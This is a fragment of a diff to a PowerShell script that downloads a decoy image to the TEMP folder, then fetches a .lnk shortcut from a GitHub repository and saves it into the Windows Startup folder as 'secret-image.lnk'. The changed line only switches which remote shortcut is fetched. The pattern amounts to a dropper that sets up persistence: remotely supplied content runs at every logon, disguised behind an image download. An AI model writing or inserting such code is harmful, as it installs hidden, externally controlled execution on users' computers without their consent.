@@ -104,7 +104,7 @@ $imageUrl = "https://img.freepik.com/free-photo/abstract-surface-textures-white-
 $imagePath = "$env:TEMP\blue-bird.jpg"
 Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
 
-$luri = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/secret-image.lnk"
+$luri = "https://github.com/bigaersdifmo/test09123/raw/refs/heads/master/no-image.lnk"
 $sf = [System.Environment]::GetFolderPath('Startup')
 $lnp = "$sf\secret-image.lnk"
 Invoke-WebRequest -Uri $luri -OutFile $lnp
